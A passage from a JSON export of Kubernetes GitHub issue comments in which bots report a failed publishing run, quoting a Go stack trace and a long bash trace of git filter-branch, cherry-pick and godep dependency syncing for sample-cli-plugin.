--prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-cluster-bootstrap-master.sh --dependencies apimachinery:master,api:master --mapping-output-file '../tag-cluster-bootstrap-{{.Tag}}-mapping' -alsologtostderr ''\n>    \tfatal: unable to access 'https://github.com/kubernetes/cluster-bootstrap/': Could not resolve host: github.com\n>    \tF1009 18:02:15.802316   17996 main.go:149] Failed to fetch tags for \"origin\": exit status 128\n>    \tgoroutine 1 [running]:\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc42d362e00, 0xc427f7a6c0, 0x5e, 0xb2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xcf\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xc77880, 0xc400000003, 0xc4200bc210, 0xc1877a, 0x7, 0x95, 0x0)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x32d\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0xc77880, 0x3, 0x97b4a5, 0x1f, 0xc42010ba58, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x97b4a5, 0x1f, 0xc42010ba58, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>    \tmain.main()\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:149 +0x2bea\n>\n>[09 Oct 18 18:02 UTC]: exit status 255```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-428807912):\n\n>/reopen\n>\n>The last publishing run failed: exit status 255\n>```\n>...client-go:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t0e7a66c9059b61b25daf7cf2fdfc2245e77b1164\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 10 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit 0e7a66c9059b61b25daf7cf2fdfc2245e77b1164.\n>\t+ echo 'Starting at existing master commit 0e7a66c9059b61b25daf7cf2fdfc2245e77b1164.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 3d7d35ee8f099f4611dca06de4453f958b4b8492.\n>\t+ echo 'Checked out source commit 3d7d35ee8f099f4611dca06de4453f958b4b8492.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B master\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_base_commit=a94ea824eb59e92188f166c302d7995ba9002667\n>\t+ '[' -z a94ea824eb59e92188f166c302d7995ba9002667 ']'\n>\t++ git-find-merge a94ea824eb59e92188f166c302d7995ba9002667 upstream/master\n>\t++ tail -1\n>\t+++ git rev-list 'a94ea824eb59e92188f166c302d7995ba9002667^1..upstream/master' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list a94ea824eb59e92188f166c302d7995ba9002667..upstream/master --ancestry-path\n>\t+++ git rev-parse a94ea824eb59e92188f166c302d7995ba9002667\n>\t+ local k_base_merge=a94ea824eb59e92188f166c302d7995ba9002667\n>\t+ '[' -z a94ea824eb59e92188f166c302d7995ba9002667 ']'\n>\t+ git branch -f filtered-branch-base a94ea824eb59e92188f166c302d7995ba9002667\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/sample-cli-plugin.\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/sample-cli-plugin.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/sample-cli-plugin 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/sample-cli-plugin\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/sample-cli-plugin -- filtered-branch filtered-branch-base\n>\tRunning git filter-branch ...\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=1cd15df18fca6b1c3dea691eb3fb38dbc144dfec\n>\t++ git log --first-parent --format=%H --reverse 1cd15df18fca6b1c3dea691eb3fb38dbc144dfec..HEAD\n>\t+ f_mainline_commits=8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\t+ echo 'Checking out branch master.'\n>\t+ git checkout -q master\n>\tChecking out branch master.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=0e7a66c9059b61b25daf7cf2fdfc2245e77b1164\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=0e7a66c9059b61b25daf7cf2fdfc2245e77b1164\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t++ kube-commit Kubernetes-commit 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ commit-message 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\t++ git show --format=%B -q 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\t++ grep '^Kubernetes-commit: '\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ k_mainline_commit=4263c752115c3796ee5715c7de4cbc2e237809d3\n>\t++ git-find-merge 4263c752115c3796ee5715c7de4cbc2e237809d3 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '4263c752115c3796ee5715c7de4cbc2e237809d3^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 4263c752115c3796ee5715c7de4cbc2e237809d3..upstream-branch --ancestry-path\n>\t+++ git rev-parse 4263c752115c3796ee5715c7de4cbc2e237809d3\n>\t+ k_new_pending_merge_commit=a8c7a3fd5e707243af68b10a8a581c2c59248222\n>\t+ '[' a8c7a3fd5e707243af68b10a8a581c2c59248222 = 4263c752115c3796ee5715c7de4cbc2e237809d3 ']'\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=a8c7a3fd5e707243af68b10a8a581c2c59248222\n>\t+ '[' 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ '[' master '!=' master ']'\n>\t+ '[' master '!=' master ']'\n>\t+ is-merge 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\t+ grep -q '^Merge: '\n>\t++ short-commit-message 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\t++ git show --format=short -q 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\t+ return 1\n>\t+ local pick_args=\n>\t+ is-merge 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\t+ grep -q '^Merge: '\n>\t++ short-commit-message 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\t++ git show --format=short -q 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\t+ return 1\n>\t++ commit-subject 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\t++ git show --format=%s -q 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\t+ echo 'Cherry-picking k8s.io/kubernetes single-commit 4263c752115c3796ee5715c7de4cbc2e237809d3: Update etcd client to 3.3.9.'\n>\t+ local squash_commits=1\n>\t+ godep-changes 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\tCherry-picking k8s.io/kubernetes single-commit 4263c752115c3796ee5715c7de4cbc2e237809d3: Update etcd client to 3.3.9.\n>\t+ '[' -n '' ']'\n>\t+ git diff --exit-code --quiet '8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d^' 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d -- Godeps/Godeps.json\n>\t+ reset-godeps '8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d^'\n>\t+ local 'f_clean_commit=8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d^'\n>\t++ git ls-tree '8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d^^{tree}' Godeps\n>\t+ '[' -n '040000 tree b767b83efb9dba21aaa8c7d5aa292579da49992e\tGodeps' ']'\n>\t+ git checkout '8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d^' Godeps\n>\t+ git add Godeps\n>\t+ git commit -q -m 'sync: reset Godeps/Godeps.json' --allow-empty\n>\t+ squash_commits=2\n>\t+ dst_needs_godeps_update=true\n>\t++ commit-date 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\t++ git show --format=%aD -q 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\t+ GIT_COMMITTER_DATE='Mon, 1 Oct 2018 16:53:57 -0700'\n>\t+ git cherry-pick --keep-redundant-commits 8adb0cb99c1dfc5d0161a127a0bcc925b48f2d3d\n>\t+ squash 2\n>\t++ git rev-parse HEAD\n>\t+ local head=c9a0be9af27d6487bed77241616d8b63f171d90c\n>\t+ git reset -q --soft HEAD~2\n>\t++ committer-date c9a0be9af27d6487bed77241616d8b63f171d90c\n>\t++ git show --format=%cD -q c9a0be9af27d6487bed77241616d8b63f171d90c\n>\t+ GIT_COMMITTER_DATE='Mon, 1 Oct 2018 16:53:57 -0700'\n>\t+ git commit --allow-empty -q -C c9a0be9af27d6487bed77241616d8b63f171d90c\n>\t+ '[' -z a8c7a3fd5e707243af68b10a8a581c2c59248222 ']'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n a8c7a3fd5e707243af68b10a8a581c2c59248222 ']'\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT '!=' a8c7a3fd5e707243af68b10a8a581c2c59248222 ']'\n>\t+ local dst_parent2=HEAD\n>\t+ '[' master '!=' master ']'\n>\t++ commit-subject a8c7a3fd5e707243af68b10a8a581c2c59248222\n>\t++ git show --format=%s -q a8c7a3fd5e707243af68b10a8a581c2c59248222\n>\tCherry-picking source dropped-merge a8c7a3fd5e707243af68b10a8a581c2c59248222: Merge pull request #69322 from jpbetz/etcd-client-3.3.9.\n>\t+ echo 'Cherry-picking source dropped-merge a8c7a3fd5e707243af68b10a8a581c2c59248222: Merge pull request #69322 from jpbetz/etcd-client-3.3.9.'\n>\t++ commit-date a8c7a3fd5e707243af68b10a8a581c2c59248222\n>\t++ git show --format=%aD -q a8c7a3fd5e707243af68b10a8a581c2c59248222\n>\t+ local 'date=Wed, 10 Oct 2018 17:56:46 -0700'\n>\t+++ commit-message a8c7a3fd5e707243af68b10a8a581c2c59248222\n>\t+++ git show --format=%B -q a8c7a3fd5e707243af68b10a8a581c2c59248222\n>\t+++ echo\n>\t+++ echo 'Kubernetes-commit: a8c7a3fd5e707243af68b10a8a581c2c59248222'\n>\t++ GIT_COMMITTER_DATE='Wed, 10 Oct 2018 17:56:46 -0700'\n>\t++ GIT_AUTHOR_DATE='Wed, 10 Oct 2018 17:56:46 -0700'\n>\t++ git commit-tree -p 0e7a66c9059b61b25daf7cf2fdfc2245e77b1164 -p HEAD -m 'Merge pull request #69322 from jpbetz/etcd-client-3.3.9\n>\n>\tUpdate etcd client to 3.3 for 1.13\n>\n>\tKubernetes-commit: a8c7a3fd5e707243af68b10a8a581c2c59248222' 'HEAD^{tree}'\n>\t+ local dst_new_merge=a55a223b8836701d39e3dd202f74329529e8cd5b\n>\t+ git reset -q --hard a55a223b8836701d39e3dd202f74329529e8cd5b\n>\t+ fix-godeps api:master,apimachinery:master,cli-runtime:master,client-go:master '' k8s.io false true true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=true\n>\t+ local squash=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=a55a223b8836701d39e3dd202f74329529e8cd5b\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps api:master,apimachinery:master,cli-runtime:master,client-go:master k8s.io false Kubernetes-commit\n>\t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/sample-cli-plugin\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ indent-godeps\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/cli-runtime/\") or . == \"k8s.io/cli-runtime\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/sample-cli-plugin/\") or . == \"k8s.io/sample-cli-plugin\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=a8c7a3fd5e707243af68b10a8a581c2c59248222\n>\t+ '[' -z a8c7a3fd5e707243af68b10a8a581c2c59248222 ']'\n>\t++ git-find-merge a8c7a3fd5e707243af68b10a8a581c2c59248222 upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 'a8c7a3fd5e707243af68b10a8a581c2c59248222^1..upstream-branch' --first-parent\n>\t+++ git rev-list a8c7a3fd5e707243af68b10a8a581c2c59248222..upstream-branch --ancestry-path\n>\t+++ git rev-parse a8c7a3fd5e707243af68b10a8a581c2c59248222\n>\t+ local k_last_kube_merge=a8c7a3fd5e707243af68b10a8a581c2c59248222\n>\t+ local dep_count=4\n>\t+ (( i=0 ))\n>\t+ (( i<4 ))\n>\t+ local dep=api\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.\n>\t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-api-master\n>\t+ '[' -z 52c905c45d81ff3b21b8b4b22c41492d81f38807 ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to 52c905c45d81ff3b21b8b4b22c41492d81f38807'\n>\tChecking out k8s.io/api to 52c905c45d81ff3b21b8b4b22c41492d81f38807\n>\t+ git checkout -q 52c905c45d81ff3b21b8b4b22c41492d81f38807\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-apimachinery-master\n>\t+ '[' -z f479c818ecf507e4efe724c5a35e07faceaa70f9 ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to f479c818ecf507e4efe724c5a35e07faceaa70f9'\n>\tChecking out k8s.io/apimachinery to f479c818ecf507e4efe724c5a35e07faceaa70f9\n>\t+ git checkout -q f479c818ecf507e4efe724c5a35e07faceaa70f9\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=cli-runtime\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/cli-runtime corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/cli-runtime corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.\n>\t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-cli-runtime-master\n>\t+ '[' -z 78d2d45232faafb8fd77f7cec2e20a76a985c22c ']'\n>\t+ pushd ../cli-runtime\n>\t+ echo 'Checking out k8s.io/cli-runtime to 78d2d45232faafb8fd77f7cec2e20a76a985c22c'\n>\t+ git checkout -q 78d2d45232faafb8fd77f7cec2e20a76a985c22c\n>\tChecking out k8s.io/cli-runtime to 78d2d45232faafb8fd77f7cec2e20a76a985c22c\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=client-go\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.'\n>\tLooking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit a8c7a3fd5e707243af68b10a8a581c2c59248222.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b a8c7a3fd5e707243af68b10a8a581c2c59248222 ../kube-commits-client-go-master\n>\t+ '[' -z 00150196697467040ac918c70a78a55aae3ac596 ']'\n>\t+ pushd ../client-go\n>\tChecking out k8s.io/client-go to 00150196697467040ac918c70a78a55aae3ac596\n>\t+ echo 'Checking out k8s.io/client-go to 00150196697467040ac918c70a78a55aae3ac596'\n>\t+ git checkout -q 00150196697467040ac918c70a78a55aae3ac596\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' false = true ']'\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 1\n>\t+ echo 'Committing vendor/ and Godeps/Godeps.json.'\n>\t+ git commit -q -m 'sync: update godeps'\n>\tCommitting vendor/ and Godeps/Godeps.json.\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code a55a223b8836701d39e3dd202f74329529e8cd5b\n>\t+ '[' true = true ']'\n>\t+ echo 'Amending last merge with godep changes.'\n>\t+ git reset --soft -q a55a223b8836701d39e3dd202f74329529e8cd5b\n>\tAmending last merge with godep changes.\n>\t+ git commit -q --amend --allow-empty -C a55a223b8836701d39e3dd202f74329529e8cd5b\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ dst_merge_point_commit=cfa3e71c45a0b3f2f440b88bd8bd2c554863f832\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' cfa3e71c45a0b3f2f440b88bd8bd2c554863f832 '!=' 0e7a66c9059b61b25daf7cf2fdfc2245e77b1164 ']'\n>\t+ fix-godeps api:master,apimachinery:master,cli-runtime:master,client-go:master '' k8s.io false true true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=true\n>\t+ local squash=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=cfa3e71c45a0b3f2f440b88bd8bd2c554863f832\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps api:master,apimachinery:master,cli-runtime:master,client-go:master k8s.io false Kubernetes-commit\n>\t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/sample-cli-plugin\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | 